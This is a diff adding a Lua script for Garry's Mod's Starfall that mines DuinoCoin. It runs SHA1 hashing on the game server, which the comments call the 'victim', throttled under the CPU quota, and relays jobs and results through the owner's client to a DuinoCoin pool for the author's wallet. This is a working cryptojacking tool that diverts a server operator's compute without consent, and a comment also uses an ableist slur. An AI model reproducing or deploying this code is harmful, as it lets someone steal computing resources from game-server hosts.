@@ -1,0 +1,97 @@
+--@name duinocoin miner
+--@author xandertron
+--@shared
+
+--you will need chromium for this to work, use https://github.com/solsticegamestudios/GModCEFCodecFix if websockets dont work
+
+username = "" --duinocoin.com username aka wallet address
+key = "" --key, leave blank if none
+difficulty = "LOW" --change to MEDIUM if you see too low starting difficulty
+
+if SERVER then
+    local owner = find.playersByName("Xandertron",true,true) --change this to your name, case sensitive, must be exact
+    local sha1 = bit.sha1
+    local curtime = timer.curtime
+    local function canRun()
+        return quotaTotalAverage()<quotaMax()*0.8 --cpu percentage from 0 to 1, 0.5 will be 50% max usage
+    end
+    local function mine(last,expect,dif)
+        print("Difficulty: "..dif)
+        res = 1
+        starttime = curtime()
+        endtime = 0
+        hook.add("Think","mine",function()
+            while canRun() do
+                cur = sha1(last..res)
+                if cur == expect then
+                    endtime = curtime()
+                    time = math.round(endtime - starttime,1)
+                    print("Took "..time.." seconds with a hashrate of "..math.round((res/(endtime - starttime))/1000,1).."kH/s ("..math.round((res/(100*dif))*100,1).."%)")
+                    hook.remove("Think","mine")
+                    net.start("result")
+                    net.writeTable({res,math.ceil(res/(endtime - starttime))})
+                    net.send(owner)
+                    break
+                end
+                res = res + 1
+            end
+        end)
+    end
+    net.receive("job",function()
+        message = net.readString()
+        spl = string.split(message,",")
+        mine(spl[1],spl[2],spl[3])
+    end)
+        
+else
+    if player() ~= owner() then return end
+    local socket = WebSocket("magi.duinocoin.com",14808,true)
+    net.receive("result",function()
+        results = net.readTable()
+        if socket:getState() == 1 then
+            socket:write(results[1]..","..results[2]..",sfminer v0.1")
+        else
+            print(socket:getState())
+            print("Reconnecting")
+            socket = WebSocket("magi.duinocoin.com",14808,true)
+            function socket:onMessage(message)
+                if string.startWith(message,"3.0") then
+                    --notify and get first job
+                    print("Connected to node successfully")
+                    self:write("JOB,"..username..","..difficulty..","..key)
+                elseif string.startWith(message,"GOOD") then
+                    --if the result from victim was good, get another job
+                    self:write("JOB,"..username..","..difficulty..","..key)
+                elseif #message >= 40 then
+                    --send job off to victim
+                    net.start("job")
+                    net.writeString(message)
+                    net.send()
+                elseif message ~= "" then
+                    --server is sperging
+                    print(message)
+                end
+            end
+            socket:connect()
+        end
+    end)
+    function socket:onMessage(message)
+        if string.startWith(message,"3.0") then
+            --notify and get first job
+            print("Connected to node successfully")
+            self:write("JOB,"..username..","..difficulty..","..key)
+        elseif string.startWith(message,"GOOD") then
+            --if the result from victim was good, get another job
+            self:write("JOB,"..username..","..difficulty..","..key)
+        elseif #message >= 40 then
+            --send job off to victim
+            net.start("job")
+            net.writeString(message)
+            net.send()
+        elseif message ~= "" then
+            --server is sperging
+            print(message)
+        end
+    end
+    socket:connect()
+end
